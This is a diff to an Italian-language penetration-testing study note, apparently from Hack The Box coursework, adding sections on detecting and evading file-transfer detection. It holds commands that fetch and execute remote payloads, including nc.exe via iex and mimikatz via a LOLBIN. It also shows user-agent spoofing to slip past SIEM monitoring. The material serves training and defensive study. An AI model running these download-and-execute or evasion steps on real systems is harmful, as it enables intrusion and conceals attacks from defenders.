@@ -20,8 +20,8 @@
   - [Upload Operations](#upload-operations)
     - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode-1)
     - [PowerShell Web Uploads](#powershell-web-uploads)
-        - [Installing a Configured WebServer with Upload](#installing-a-configured-webserver-with-upload)
-        - [PowerShell Script to Upload a File to Python Upload Server](#powershell-script-to-upload-a-file-to-python-upload-server)
+      - [Installing a Configured WebServer with Upload](#installing-a-configured-webserver-with-upload)
+      - [PowerShell Script to Upload a File to Python Upload Server](#powershell-script-to-upload-a-file-to-python-upload-server)
       - [Powershell base64 web upload](#powershell-base64-web-upload)
     - [SMB Uploads](#smb-uploads)
       - [Configure webdav server](#configure-webdav-server)
@@ -41,6 +41,33 @@
 - [Protected file transfer](#protected-file-transfer)
   - [File encryption on windows](#file-encryption-on-windows)
   - [File encryption on linux](#file-encryption-on-linux)
+- [Catching Files over HTTP/S](#catching-files-over-https)
+  - [Nginx - Enabling PUT](#nginx---enabling-put)
+    - [Create a Directory to Handle Uploaded Files](#create-a-directory-to-handle-uploaded-files)
+    - [Change the Owner to www-data](#change-the-owner-to-www-data)
+    - [Create Nginx Configuration File](#create-nginx-configuration-file)
+    - [Symlink our Site to the sites-enabled Directory](#symlink-our-site-to-the-sites-enabled-directory)
+    - [Start Nginx](#start-nginx)
+    - [Verifying Errors](#verifying-errors)
+    - [Remove NginxDefault Configuration](#remove-nginxdefault-configuration)
+    - [Upload File Using cURL](#upload-file-using-curl)
+- [Living off The Land](#living-off-the-land)
+  - [GTFOBins](#gtfobins)
+    - [Create Certificate in our Pwnbox](#create-certificate-in-our-pwnbox)
+    - [Stand up the Server in our Pwnbox](#stand-up-the-server-in-our-pwnbox)
+    - [Download File from the Compromised Machine](#download-file-from-the-compromised-machine)
+  - [Other Common Living off the Land tools](#other-common-living-off-the-land-tools)
+- [Detection](#detection)
+  - [Invoke-WebRequest - Client](#invoke-webrequest---client)
+  - [Invoke-WebRequest - Server:](#invoke-webrequest---server)
+  - [WinHttpRequest - Client](#winhttprequest---client)
+  - [WinHttpRequest - Server](#winhttprequest---server)
+  - [Certutil - Client](#certutil---client)
+  - [Certutil - Server](#certutil---server)
+  - [BITS - Client](#bits---client)
+  - [BITS - Server](#bits---server)
+  - [Msxml2 - Server](#msxml2---server)
+- [Evading detection](#evading-detection)
 
 
 # Windows file transfer methods
@@ -576,3 +603,95 @@ crirom00@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
 
 - Certutil: download arbitrary files (simil a wget).
     - C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+
+# Detection
+1. Command-Line Detection based on blacklisting: Bloccare o rilevare comandi specifici (es. certutil, powershell IEX) è facile da aggirare per gli attaccanti, ad esempio cambiando maiuscole/minuscole o usando cifrature e variabili. Whitelisting: Creare una lista di tutti i comandi legittimi e autorizzati in una rete aziendale richiede tempo iniziale, ma è un metodo molto efficace, qualsiasi comando non presente nella lista genera immediatamente un allarme.
+
+2. Rilevamento tramite User-Agent e Header HTTP: Quando un utente o uno strumento effettua una richiesta HTTP a un server web, invia un'intestazione chiamata User-Agent che identifica l'applicazione utilizzata (es. Chrome, Firefox, cURL, Python o strumenti di attacco come sqlmap e nmap).Gli analisti di sicurezza integrano nei SIEM elenchi di User-Agent legittimi (processi del SO, aggiornamenti di Windows Update o dell'antivirus). In questo modo, traffico insolito o User-Agent non standard vengono evidenziati come anomalie sospette.
+
+
+3. User-Agent/header per Windows:  quali User-Agent vengono inviati ai log del server web quando un attaccante esegue comandi di trasferimento file su Windows:
+### Invoke-WebRequest - Client 
+- PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
+- PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
+
+### Invoke-WebRequest - Server:
+- GET /nc.exe HTTP/1.1
+- User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) 
+- WindowsPowerShell/5.1.14393.0
+
+### WinHttpRequest - Client
+PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
+PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
+PS C:\htb> $h.send();
+PS C:\htb> iex $h.ResponseText
+
+### WinHttpRequest - Server
+GET /nc.exe HTTP/1.1
+Connection: Keep-Alive
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+
+### Certutil - Client
+C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
+C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
+
+### Certutil - Server
+GET /nc.exe HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Accept: */*
+User-Agent: Microsoft-CryptoAPI/10.0
+
+### BITS - Client
+PS C:\htb> Import-Module bitstransfer;
+PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
+PS C:\htb> $r=gc $env:temp\t;
+PS C:\htb> rm $env:temp\t; 
+PS C:\htb> iex $r
+
+### BITS - Server
+HEAD /nc.exe HTTP/1.1
+Connection: Keep-Alive
+Accept: */*
+Accept-Encoding: identity
+User-Agent: Microsoft BITS/7.8
+
+### Msxml2 - Server
+GET /nc.exe HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+UA-CPU: AMD64
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
+
+Per i Difensori (Blue Team): Se nei log del web server o del firewall aziendale compare una richiesta diretta verso Internet da Microsoft-CryptoAPI/10.0 o Microsoft BITS/7.8 diretta a un IP non Microsoft per scaricare un file eseguibile (.exe), si tratta di un indicatore di compromissione (IoC) quasi certo.
+
+Per gli Attaccanti (Red Team): L'utilizzo delle impostazioni predefinite di questi strumenti lascia impronte digitali nei log. Gli attaccanti più avanzati modificano l'User-Agent predefinito nei propri script (es. impostando uno User-Agent identico a quello di Google Chrome) per mimetizzarsi nel traffico web legittimo.
+
+# Evading detection
+
+1. Modifica dello User-Agent in PowerShell
+I difensori monitorano i log di rete per individuare User-Agent predefiniti di PowerShell o di utility di sistema (es. WindowsPowerShell/...). Con Invoke-WebRequest, è possibile sovrascrivere lo User-Agent mimetizzandosi tra i browser legittimi aziendali (come Chrome, Firefox, Safari).
+
+Elenco degli User-Agent predefiniti in PowerShell:
+- [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";
+ Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}}
+
+Esecuzione del Download con User-Agent Chrome:
+
+- $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+- Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+
+Risultato nei log del server web: La richiesta appare inviata da un browser Chrome standard (Mozilla/5.0... Chrome/7.0...), riducendo il rischio di segnalazioni immediate nel SIEM.
+
+2. Uso di LOLBAS e GTFOBins
+Quando le politiche di Application Whitelisting (es. AppLocker) bloccano PowerShell o Netcat, oppure il logging da riga di comando è particolarmente restrittivo, gli attaccanti usano i LOLBINs (Living Off The Land Binaries). 
+
+Esempio (Windows): GfxDownloadWrapper.exe (driver grafico Intel):
+- GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+
+LOLBAS Project: Catalogo di binari, script e driver nativi Windows usabili per bypass di sicurezza e file transfer.
+
+GTFOBins: Equivalente per ambienti Linux/Unix per sfruttare binari di sistema installati (es. wget, curl, python, gdb, ecc.).
